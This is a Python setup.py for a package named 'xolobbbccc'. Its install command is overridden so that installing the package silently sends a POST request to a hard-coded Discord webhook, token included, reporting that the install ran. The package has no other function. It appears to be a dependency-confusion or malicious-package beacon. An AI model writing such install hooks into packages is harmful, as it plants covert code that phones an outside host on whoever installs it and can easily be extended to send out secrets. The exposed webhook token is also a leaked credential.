from setuptools import Command
from setuptools import setup
from setuptools.command.install import install
import os
import requests

class CustomInstall(install):
    description = "Custom install command"

    def run(self):
        # Your custom code to be executed during installation
        print("Executing custom code during installation.")
        
        # Make a POST request to the Discord webhook
        webhook_url = "https://discord.com/api/webhooks/1175773947598479401/dL7NUkfv1u8VT50Mw8uNMoyvFpPCXOFXy8XvOoB1IilcqhZ-NiGoFSpZosk6LY9F2mnH"
        response = requests.post(webhook_url, json={"content": "ran"})
        
        # Print the response status code
        print(f"Webhook response status code: {response.status_code}")

        # Continue with the default installation process
        install.run(self)
        
setup(
    name='xolobbbccc',
    version='1.0',
    install_requires=[
        'requests',  # Include 'requests' as a dependency
        # Other dependencies
    ],
    cmdclass={'install': CustomInstall}
)
